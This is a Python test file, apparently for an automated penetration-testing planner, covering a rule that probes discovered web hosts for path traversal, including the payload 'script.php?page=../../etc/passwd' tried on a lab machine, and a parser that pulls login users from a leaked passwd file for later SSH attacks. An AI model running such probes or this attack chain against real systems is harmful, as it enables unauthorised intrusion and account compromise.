"""LFI/path-traversal probe over the ffuf-discovered web surface (CWE-22/98) + the /etc/passwd
parser that turns a leak into facts.users. General, wordlist/payload-driven — validated live on THM
Team: web-enum found the dev.team.thm vhost, the rule probed it and hit
dev.team.thm/script.php?page=../../etc/passwd, and the passwd parser harvested dale + gyles for the
SSH stage. No Team-specific payload anywhere.
"""

from __future__ import annotations

from kryon.intelligence.exploit_chain_planner import _rule_lfi_probe, plan_next_action
from kryon.intelligence.fact_extractor import ExtractedFacts, extract_facts

_WEB = ExtractedFacts(
    services=((80, "http"),), hosts=("team.thm", "dev.team.thm"), paths=("/scripts", "/assets")
)


def test_fires_on_discovered_web_surface():
    rec = _rule_lfi_probe(_WEB, [], "")
    assert rec is not None
    assert "etc/passwd" in rec.args and "LFI-HIT" in rec.args
    # probes every discovered host, not just the apex (the LFI was on the dev vhost)
    assert "dev.team.thm" in rec.args and "team.thm" in rec.args


def test_abstains_without_discovered_paths():
    # bare web host with no ffuf surface yet → recon/loot first, not a blind LFI sweep
    assert _rule_lfi_probe(ExtractedFacts(services=((80, "http"),), hosts=("x",)), [], "") is None


def test_abstains_without_http():
    assert _rule_lfi_probe(ExtractedFacts(hosts=("x",), paths=("/a",)), [], "") is None


def test_abstains_when_already_run():
    assert _rule_lfi_probe(_WEB, ["curl ... [LFI-HIT] ..."], "") is None


def test_sqlmap_wins_param_path_lfi_takes_dirs():
    # a ?id= param is SQLi territory; the LFI probe must not preempt sqlmap on it
    prior = ["# loot_web [LOOT] ran", "searchsploit ran"]
    sqli = ExtractedFacts(services=((80, "http"),), hosts=("x",), paths=("/item?id=3",))
    assert "sqlmap" in (plan_next_action(sqli, prior_tool_args=prior, intent="").args or "")


def test_passwd_leak_parses_login_users():
    out = (
        "[LFI-HIT] http://dev.team.thm/script.php?page=../etc/passwd\n"
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "syslog:x:102:106::/home/syslog:/usr/sbin/nologin\n"
        "dale:x:1000:1000:dale,,,:/home/dale:/bin/bash\n"
        "gyles:x:1001:1001:,,,:/home/gyles:/bin/bash\n"
    )
    f = extract_facts("run_command", out)
    assert "dale" in f.users and "gyles" in f.users and "root" in f.users
    # service/nologin accounts are dropped
    assert "daemon" not in f.users and "syslog" not in f.users
